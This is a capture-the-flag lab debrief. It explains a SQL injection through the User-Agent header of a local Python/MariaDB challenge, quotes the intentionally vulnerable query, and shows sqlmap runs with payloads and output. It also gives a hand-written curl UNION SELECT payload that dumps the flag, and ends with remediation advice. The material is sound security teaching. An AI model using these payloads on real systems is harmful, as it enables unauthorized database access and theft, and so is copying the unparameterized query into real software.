# The Disguised Examiner, Debrief

**Node:** `p2_3` &middot; **Flag:** `SEIYAKU{the_header_was_the_door}` &middot; **Route:** `GET /p2/examiner` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (`visitor_log` table, `examiner_vault` table)

## Root cause

The check-in form's own field really is safe. Looking an examiner up by
`badge_id` uses a proper parameterized query:

```python
# challenges/phase2.py
cur.execute(
    "SELECT id, badge_id, name, role FROM examiners WHERE badge_id = %s",
    (badge_id,),
)
examiner = cur.fetchone()
```

Nothing typed into that field ever reaches an unsafe query, there is no
injection to find there, and this floor's DEBRIEF confirms it below by
actually trying.

The real sink sits two statements later, in code the form's own field
never touches at all:

```python
# every visit is logged safely, this INSERT is not the bug
cur.execute(
    "INSERT INTO visitor_log (ua, seen_at) VALUES (%s, %s)",
    (user_agent, datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")),
)

# VULN: string concat, the User-Agent HTTP header, fully attacker-
# controlled, spliced directly into the SQL text with no escaping or
# parameterization whatsoever.
q = (
    "SELECT id, ua, seen_at FROM visitor_log "
    f"WHERE ua = '{user_agent}' ORDER BY id DESC LIMIT 5"
)
cur.execute(q)
log_rows = cur.fetchall()
```

`user_agent` here is `request.headers.get("User-Agent", "")`, a value
that comes from the HTTP request itself, not from anything the check-in
form submits. Every single request carries a `User-Agent` header (or
lets the client set one to whatever it likes), and this floor trusts
that value completely when it builds its "recent check-ins from this
device" query. The result set (`id, ua, seen_at`) is rendered straight
into the page's table, the same reflected-UNION shape as `p2_1`'s
`floors` table and `p2_2`'s `cms_news` table, just fed by a header
instead of a query parameter.

`examiner_vault`, the table actually holding this floor's flag, is
never touched by any query `/p2/examiner`'s own code constructs on its
own. It only becomes reachable by riding the `User-Agent` header
injection into a `UNION SELECT` against it.

## Why the form field is a genuine dead end, not just "unused"

Confirmed live, by actually testing it, pointing sqlmap straight at
`badge_id` at its own defaults:

```
sqlmap -r req_p23_form.txt -p badge_id --batch --ignore-stdin -v 1
```

```
[13:55:46] [INFO] testing for SQL injection on GET parameter 'badge_id'
[13:55:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:55:46] [WARNING] reflective value(s) found and filtering out
[13:55:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:55:46] [INFO] testing 'Generic inline queries'
[13:55:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:55:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:55:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:55:47] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:55:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:55:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:55:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:55:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:55:48] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:55:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:55:48] [INFO] testing 'Oracle AND time-based blind'
[13:55:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:55:48] [WARNING] GET parameter 'badge_id' does not seem to be injectable
[13:55:48] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
```

(Real, live output against this exact seed, not a hypothetical
transcript.) The form field is a genuine dead end: sqlmap tried boolean,
error, stacked, time, and UNION techniques against `badge_id` across
five DBMS dialects, and it is not injectable, because it really is
parameterized. This isn't "the field is unused", it's actively queried,
and it's safe.

## The technique: injectable inputs that never touch a form field

Every earlier Phase-2 floor's injectable value arrived as a URL query
parameter (`?id=...`, `?page=...&id=...`). This floor's injectable value
is an **HTTP header**, `User-Agent`, which a normal web form has no
way to represent at all, because it isn't part of the form; it's part of
the transport every request rides in on. The same principle extends to
anything else a request carries that a server-side handler might read
without a second thought: other request headers (`Referer`, `X-
Forwarded-For`, a custom `X-*` header), cookies, or any value pulled from
`request.headers`/`request.cookies` instead of `request.args`/
`request.form`. None of these show up anywhere in a form's HTML, the
only way to know they're being used at all is to read the server's code,
or to notice that a scanner's results changed once it started looking
somewhere new.

### Why sqlmap's defaults miss this, and what makes it look

sqlmap's `--level` option (1-5) doesn't just control how many payloads
it tries per parameter, starting at level 3, it also starts testing
values it otherwise leaves alone entirely: the `User-Agent` and
`Referer` headers. (Level 5 adds the `Host` header and a wider payload
set on top of that.) At the default `--level 1`, sqlmap only ever tests
GET/POST parameters and, if present, the `Cookie` header; it never
looks at `User-Agent` at all, which is exactly why the transcript above
comes back clean even with `-v 1` verbose logging showing every single
test it ran.

There are two ways to make sqlmap look at a header at all:

1. **Raise `--level` to 3 or higher**, and let sqlmap discover the
   header on its own, alongside whatever GET/POST parameters exist.
2. **Mark the header explicitly** with sqlmap's `*` injection marker
   inside a saved `-r request.txt` request file (e.g.
   `User-Agent: seiyaku-arc-solver*`), this tells sqlmap exactly where
   to inject regardless of `--level`, and is the more surgical, more
   reproducible option once you already suspect which header matters.

### Proof: `--level 3`, no marker, auto-discovering the header

Same request file, this time with a harmless, genuinely-safe
`badge_id=HA-014` GET parameter present (so sqlmap has at least one
"normal" parameter to also try) and a completely ordinary, unmarked
`User-Agent` header:

```
GET /p2/examiner?badge_id=HA-014 HTTP/1.1
Host: localhost:8000
User-Agent: seiyaku-arc-solver
Accept: */*
Connection: close
```

```
sqlmap -r req_p23_form.txt --batch --ignore-stdin --level=3 -v 1
```

Real output from this exact seed:

```
[13:56:31] [WARNING] GET parameter 'badge_id' does not seem to be injectable
[13:56:31] [INFO] testing if parameter 'User-Agent' is dynamic
[13:56:31] [INFO] parameter 'User-Agent' appears to be dynamic
[13:56:31] [INFO] heuristic (basic) test shows that parameter 'User-Agent' might be injectable (possible DBMS: 'MySQL')
[13:56:31] [INFO] testing for SQL injection on parameter 'User-Agent'
[13:56:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:56:32] [INFO] parameter 'User-Agent' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[13:56:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:56:32] [INFO] parameter 'User-Agent' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
[13:56:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:56:42] [INFO] parameter 'User-Agent' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1542 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: seiyaku-arc-solver' AND 4966=4966 AND 'tKUs'='tKUs

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: seiyaku-arc-solver' AND EXTRACTVALUE(6747,CONCAT(0x5c,0x716b717171,(SELECT (ELT(6747=6747,1))),0x7162707871)) AND 'UcyE'='UcyE

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: seiyaku-arc-solver' AND (SELECT 7071 FROM (SELECT(SLEEP(5)))nouX) AND 'tOyA'='tOyA
---
[13:56:48] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
```

Note the first line: sqlmap re-confirms `badge_id` is *not* injectable
(same conclusion as the level-1 run), then goes on to test `User-Agent`
, something it never even attempted at the default level, and finds it
vulnerable on the first three technique families it tries. This is a
real, live run against this exact stack, not a hypothetical transcript.
1542 requests at `--level 3` versus a much smaller count at `--level 1`
is the direct, visible cost of that broader header/cookie coverage,
worth knowing before reaching for a higher `--level` against a real
target purely out of habit (see `p2_1`'s DEBRIEF for the same
proportionality point about `--level`/`--risk` against production
systems).

### Proof: marking the header explicitly, and dumping the flag through it

Rather than rely on `--level` to auto-discover the header, the header
can be marked directly with sqlmap's `*` injection marker in a saved
request file, the more surgical option once the header is already the
suspect:

```
GET /p2/examiner HTTP/1.1
Host: localhost:8000
User-Agent: seiyaku-arc-solver*
Accept: */*
Connection: close
```

```
sqlmap -r req.txt --batch --ignore-stdin --dbms=MySQL --sql-query="SELECT secret FROM examiner_vault"
```

Real output from this exact seed:

```
[13:55:11] [INFO] testing if (custom) HEADER parameter 'User-Agent #1*' is dynamic
[13:55:11] [INFO] (custom) HEADER parameter 'User-Agent #1*' appears to be dynamic
[13:55:11] [INFO] heuristic (basic) test shows that (custom) HEADER parameter 'User-Agent #1*' might be injectable (possible DBMS: 'MySQL')
[13:55:11] [INFO] testing for SQL injection on (custom) HEADER parameter 'User-Agent #1*'
[13:55:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:55:11] [WARNING] reflective value(s) found and filtering out
[13:55:11] [INFO] (custom) HEADER parameter 'User-Agent #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[13:55:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:55:11] [INFO] (custom) HEADER parameter 'User-Agent #1*' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
[13:55:22] [INFO] (custom) HEADER parameter 'User-Agent #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[13:55:23] [INFO] target URL appears to be UNION injectable with 3 columns
[13:55:23] [INFO] (custom) HEADER parameter 'User-Agent #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: User-Agent #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: seiyaku-arc-solver' AND 9673=9673 AND 'qjhH'='qjhH

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: seiyaku-arc-solver' AND EXTRACTVALUE(3450,CONCAT(0x5c,0x7178787a71,(SELECT (ELT(3450=3450,1))),0x7171767671)) AND 'mfbR'='mfbR

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: seiyaku-arc-solver' AND (SELECT 8052 FROM (SELECT(SLEEP(5)))DScy) AND 'duJs'='duJs

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: seiyaku-arc-solver' UNION ALL SELECT CONCAT(0x7178787a71,0x4872764b6c6e656c69646e596462516364696844577070644c786f4f7056676353456156446d716c,0x7171767671),NULL,NULL-- -
---
[13:55:23] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[13:55:23] [INFO] fetching SQL SELECT statement query output: 'SELECT secret FROM examiner_vault'
SELECT secret FROM examiner_vault: 'SEIYAKU{the_header_was_the_door}'
```

sqlmap dumps the flag directly. (`--sql-query` was used here in place of
`--dump -T examiner_vault` because, on this MariaDB version, sqlmap's
automatic `information_schema` column-name lookup for a freshly-seeded
table sometimes needs an interactive fallback that `--batch` answers
"no" to by default, `--sql-query` sidesteps that entirely and is the
more reliable option for a hidden table whose columns you don't already
know; both reach the same table through the same header injection.)

### Proof: a hand-rolled `curl` demonstration, no sqlmap at all

The same injection, done by hand with nothing but `curl -A`:

```
curl -s -A "x' UNION SELECT id, secret, codename FROM examiner_vault-- -" \
    http://localhost:8000/p2/examiner
```

Real excerpt from the rendered "recent check-ins from this device"
table in the response, this exact seed:

```html
<tr class="border-b border-white/5 last:border-b-0">
  <td class="px-3 py-2 break-all">1</td>
  <td class="px-3 py-2 break-all">SEIYAKU{the_header_was_the_door}</td>
  <td class="px-3 py-2 break-all">the disguised examiner</td>
</tr>
```

The payload's three `UNION SELECT` columns (`id, secret, codename`) line
up with `visitor_log`'s own three rendered columns (`id, ua, seen_at`),
so `examiner_vault.secret` surfaces in the page's `ua` column exactly
where a real check-in's User-Agent string would otherwise appear. This
is exactly what `solvers/p2_3.sh` automates end-to-end.

## HxH analogy

Trick Tower's examiners are supposed to be the one fixed, trustworthy
point in an otherwise adversarial exam, you answer to them, and they
decide whether you pass. This floor's examiner looks and acts exactly
like that: ask it who you are by badge id, and it answers plainly,
honestly, safely. The threat was never standing at that desk. It was
riding in on the applicant the whole time, in a place nobody thought to
check because nobody expects an examiner to be listening to anything
except the question asked of them out loud. A disguised examiner isn't
dangerous because of what it says back, it's dangerous because
everyone assumed the only channel worth guarding was the one they could
see.

## Remediation

- **Parameterize every input that reaches a query, headers and cookies
  included, with no "it's just internal logging" exception:**

  ```python
  cur.execute(
      "SELECT id, ua, seen_at FROM visitor_log WHERE ua = %s ORDER BY id DESC LIMIT 5",
      (user_agent,),
  )
  ```

  The fix is identical in shape to every other floor in this lab, bind
  the value instead of splicing it into the SQL text, but the lesson
  here is about *scope*, not technique: this bug exists specifically
  because a value from `request.headers` was treated as less dangerous
  than a value from `request.args`/`request.form`, when both are equally
  attacker-controlled the moment they leave the client. A codebase-wide
  rule of "every value that reaches a query is parameterized, full stop",
  with no carve-out for values that "just come from a header" or
  "are only used for logging", is what actually closes this class of
  bug, because the next one won't announce itself as a header either.
- **Don't trust a scanner's default settings to mean "nothing here."** A
  clean `sqlmap` run at `--level 1` against a target's form fields says
  exactly what it tested, GET/POST parameters, plus cookies, and
  nothing about headers it never looked at. Treat "not injectable at
  these settings" as a statement about the settings, not a clearance of
  the target; deliberately testing non-form inputs (raise `--level`, or
  mark specific headers/cookies by hand) is part of a genuinely thorough
  assessment, not an optional extra.
- **Least-privilege database accounts**, same as every floor in this
  lab: a DB user scoped to only the tables a route's legitimate queries
  actually need means a missed injection point, header-based or
  otherwise, still can't reach a table like `examiner_vault` that the
  route never touches on its own.
